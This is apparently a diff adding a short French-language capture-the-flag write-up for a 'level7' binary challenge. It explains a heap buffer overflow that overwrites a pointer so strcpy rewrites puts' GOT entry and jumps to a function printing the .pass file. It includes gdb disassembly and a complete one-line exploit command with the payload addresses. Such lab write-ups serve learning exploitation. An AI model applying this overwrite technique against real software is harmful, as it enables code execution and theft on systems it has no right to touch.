@@ -1,0 +1,34 @@
+technique: heap based buffer overflow
+
+on overflow dans un malloc, donc sur la heap
+en examinant la heap avec gdb, on voit
+que le buffer dans lequel est copie argv[1] fait
+8 octet. puis on parcours 8 octet pour skip les metadonnees
+de la struct2, puis 4 pour skip la premiere valeure,
+puis on est au niveau du pointeur dans lequel on va ecrire argv[2]
+
+en faisant un overflow avec un offset de 20, on
+ecrase donc le pointeur sur la heap de la 2eme struct
+et strcpy ecrira argv[2] a cette adresse
+
+on veut appeller m qui affiche le .pass
+
+puts est appelle juste apres le fgets et on 
+peut voir cela:
+
+(gdb) disas puts
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:     jmp    *0x8049928
+   0x08048406 <+6>:     push   $0x28
+   0x0804840b <+11>:    jmp    0x80483a0
+
+on peut donc ecraser ce que pointe 0x8049928
+dans puts pour jump a m (0x080484f4)
+
+on a donc:
+
+/home/user/level7/level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print("\xf4\x84\x04\x08")')
+on ecrit l'offset, puis l'adresse dans laquelle
+on veut ecrire, puis on ecrit dans cette adresse
+l'adresse de m, puts va donc jump a m() et afficher
+le .pass.
